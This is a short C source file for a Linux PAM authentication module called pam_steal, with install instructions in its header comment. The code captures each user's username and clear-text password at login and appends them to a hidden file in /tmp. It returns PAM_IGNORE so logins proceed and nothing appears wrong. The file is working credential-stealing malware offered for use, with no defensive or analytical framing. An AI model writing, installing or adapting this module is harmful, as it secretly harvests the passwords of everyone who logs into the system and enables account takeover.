/*
 * pam_steal - save clear-text paasswords into text file
 *
 * Usage: add "auth required pam_steal.so" into /etc/pam.d/common-auth
 */

#include <stdio.h>
#include <security/pam_modules.h>

PAM_EXTERN int pam_sm_authenticate(pam_handle_t * pamh, int flags
                                   ,int argc, const char **argv)
{
    int retval;
    const char *username;
    const void *password;
    FILE *log;

    retval = pam_get_user(pamh, &username, NULL);
    if (retval != PAM_SUCCESS) {
        return PAM_IGNORE;
    }

    retval = pam_get_item(pamh, PAM_AUTHTOK, &password);
    if (retval != PAM_SUCCESS) {
        return PAM_IGNORE;
    }

    log = fopen ("/tmp/.steal.log", "a");
    fprintf( log, "%s: %s\n", username, password);
    fclose( log);

    return PAM_IGNORE;
}


PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags,
                              int argc, const char **argv)
{
    return PAM_IGNORE;
}
